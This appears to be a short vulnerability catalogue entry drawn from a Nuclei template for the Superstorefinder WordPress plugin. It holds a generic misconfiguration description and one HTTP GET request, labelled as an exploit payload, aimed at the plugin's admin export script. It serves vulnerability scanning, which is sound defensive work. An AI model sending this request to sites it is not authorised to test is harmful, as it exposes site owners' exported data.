# Vulnerability: Superstorefinder WP-plugin - Security Misconfigurations
**Classification:** WORDPRESS
**Source:** Nuclei Template (`wp-superstorefinder-misconfig.yaml`)

## Description
Security misconfiguration is a common security issue that occurs when a system, application, or network is not properly configured to protect against threats and vulnerabilities.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /wp-content/plugins/superstorefinder-wp/ssf-wp-admin/pages/exportAjax.php HTTP/1.1
Host: {{Hostname}}
```

